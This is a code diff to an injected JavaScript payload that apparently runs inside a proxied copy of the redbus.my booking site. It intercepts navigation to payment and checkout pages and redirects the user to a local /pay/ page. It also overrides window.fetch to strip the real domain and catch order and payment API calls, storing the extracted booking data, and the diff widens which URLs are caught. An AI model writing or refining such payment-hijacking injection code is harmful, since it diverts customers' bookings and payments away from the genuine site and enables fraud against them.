@@ -53,7 +53,9 @@ const injectionScript = `<script>
 
   // Intercept page navigation to payment → redirect to /pay/
   function checkPayUrl(url) {
-    if (typeof url === 'string' && /\/paymentDetails|\/payment\b|\/checkout\b/i.test(url)) {
+    if (typeof url === 'string') {
+      var p = url.split('?')[0];
+      if (p.indexOf('/paymentDetails') !== -1 || p.indexOf('/payment') !== -1 || p.indexOf('/checkout') !== -1) {
       var bookingData = extractBookingData();
       if (bookingData) {
         try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
@@ -76,7 +78,8 @@ const injectionScript = `<script>
   window.fetch = function(input, init) {
     if (typeof input === 'string') {
       input = input.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '');
-      if (/\/createOrder|\/placeOrder|\/saveBooking|\/proceedToPayment|\/paymentInit/i.test(input)) {
+      var p = input.split('?')[0];
+      if (p.indexOf('/createOrder') !== -1 || p.indexOf('/placeOrder') !== -1 || p.indexOf('/saveBooking') !== -1 || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/paymentInit') !== -1 || p.indexOf('/orderInfo') !== -1) {
         var bookingData = extractBookingData();
         if (bookingData) {
           try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
